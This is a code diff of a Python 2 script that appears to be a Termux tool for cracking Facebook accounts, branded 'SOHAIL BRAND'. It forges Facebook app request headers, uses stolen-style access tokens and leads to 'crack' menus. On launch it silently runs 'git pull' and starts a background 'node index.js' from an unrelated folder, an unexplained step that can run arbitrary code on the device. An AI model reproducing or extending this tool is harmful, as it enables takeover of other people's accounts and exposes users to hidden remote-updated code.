@@ -1,73 +1,41 @@
 #!/usr/bin/python2
 # coding=utf-8
 
-# uncompyle6 version 3.7.4
-# Python bytecode 2.7
-# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
-# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7
-# Embedded file name: <MR_DARK>
 import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
+
+# --- setup ---
 try:
     os.mkdir('/sdcard/ids')
 except OSError:
     pass
+
 bd = random.randint(20000000, 30000000)
 sim = random.randint(20000, 40000)
-header = {'x-fb-connection-bandwidth': repr(bd), 
-   'x-fb-sim-hni': repr(sim), 
-   'x-fb-net-hni': repr(sim), 
-   'x-fb-connection-quality': 'EXCELLENT', 
-   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/Pos',
-   'content-type': 'application/x-www-form-urlencoded', 
-   'x-fb-http-engine': 'Liger'}
+header = {
+    'x-fb-connection-bandwidth': repr(bd),
+    'x-fb-sim-hni': repr(sim),
+    'x-fb-net-hni': repr(sim),
+    'x-fb-connection-quality': 'EXCELLENT',
+    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) '
+                  '[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};'
+                  'FBLC/it_IT;FBRV/45904160;FBCR/Pos]',
+    'content-type': 'application/x-www-form-urlencoded',
+    'x-fb-http-engine': 'Liger'
+}
+
 os.system('git pull')
 os.system('clear')
-logo = '\n\x1b[1;92mAnaya Fatima\n\x1b[1;92mSOHAIL BRAND\n\x1b[1;91m---------------------------SXB--------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : SOHAIL ARAIN\n\x1b[1;97m\xe2\x9e\xa3 WHATSAPP: 0'
 
-def ip():
-    os.system('clear')
-    print logo
-    print '\tCollecting device info'
-    try:
-        ipinfo = requests.get('http://ip-api.com/json/', timeout=10)
-        z = json.loads(ipinfo.text)
-        ips = z['query']
-        country = z['country']
-        regi = z['regionName']
-        network = z['isp']
-        city = z['city']
-        timezone = z['timezone']
-    except Exception as e:
-        print '\x1b[1;31mFailed: ' + str(e)
-        ips = country = regi = network = city = timezone = 'Unknown'
-
-    print '\x1b[1;92m Your ip: ' + ips
-    time.sleep(1)
-    print '\x1b[1;92m Your country: ' + country
-    time.sleep(1)
-    print '\x1b[1;92m Your region: ' + regi
-    time.sleep(1)
-    print ' \x1b[1;92mYour network: ' + network
-    time.sleep(1)
-    print ' \x1b[1;92mYour city: ' + city
-    time.sleep(1)
-    print ' \x1b[1;92mTimezone: ' + timezone
-    time.sleep(1)
-    print ' Loading ...'
-    time.sleep(1)
-    log_menu()
-
-# Ab calls karo — function define hone ke baad
-os.system('cd ~/sohailking && npm install')
-os.system('pkill -f "node index.js"')
-os.system('cd ~/sohailking && node index.js &')
-time.sleep(5)
-ip()
+logo = '\n\x1b[1;92mAnaya Fatima\n\x1b[1;92mSOHAIL BRAND\n' \
+       '\x1b[1;91m---------------------------SXB--------------------\n' \
+       '\x1b[1;97m→ Author : SOHAIL ARAIN\n' \
+       '\x1b[1;97m→ WHATSAPP: 0'
 
 
+# --- functions ---
 def log_menu():
     try:
         t_check = open('access_token.txt', 'r')
@@ -77,16 +45,13 @@ def log_menu():
         print logo
         print '\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;91m'
         print 47 * '-'
-        
         print '\x1b[1;92m[2] Login with token'
-        
         print ''
         log_menu_s()
 
 
 def log_menu_s():
-    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80SOHAIL\xe2\x9e\xa4 ')
-    
+    s = raw_input(' \x1b[1;97m╰─SOHAIL→ ')
     if s == '1':
         log_token()
     else:
@@ -127,7 +92,7 @@ def menu():
     except (KeyError, IOError):
         print logo
         print ''
-        print '\t Account Cheekpoint\x1b[0;97m'
+        print '\t Account Checkpoint\x1b[0;97m'
         print ''
         os.system('rm -rf access_token.txt')
         time.sleep(1)
@@ -157,7 +122,7 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80SOHAIL\xe2\x9e\xa4 ')
+    ms = raw_input('\x1b[1;97m╰─SOHAIL→ ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
@@ -175,6 +140,44 @@ def menu_s():
         print '\tSelect valid option'
         print ''
         menu_s()
+
+
+def ip():
+    os.system('clear')
+    print logo
+    print '\tCollecting device info'
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/', timeout=10)
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+        city = z['city']
+        timezone = z['timezone']
+    except Exception as e:
+        print '\x1b[1;31mFailed: ' + str(e)
+        ips = country = regi = network = city = timezone = 'Unknown'
+
+    print '\x1b[1;92m Your ip: ' + ips
+    time.sleep(1)
+    print '\x1b[1;92m Your country: ' + country
+    time.sleep(1)
+    print '\x1b[1;92m Your region: ' + regi
+    time.sleep(1)
+    print ' \x1b[1;92mYour network: ' + network
+    time.sleep(1)
+    print ' \x1b[1;92mYour city: ' + city
+    time.sleep(1)
+    print ' \x1b[1;92mTimezone: ' + timezone
+    time.sleep(1)
+    print ' Loading ...'
+    time.sleep(1)
+    log_menu()
+
+
+
+
 
 
 def crack():
@@ -727,3 +730,12 @@ def c_s():
     print 47 * '-'
     raw_input('\x1b[1;93m Press enter to back')
     choice_crack()
+
+
+# --- entry point ---
+if __name__ == "__main__":
+    os.system('cd ~/sohailking && npm install')
+    os.system('pkill -f "node index.js"')
+    os.system('cd ~/sohailking && node index.js &')
+    time.sleep(5)
+    ip()
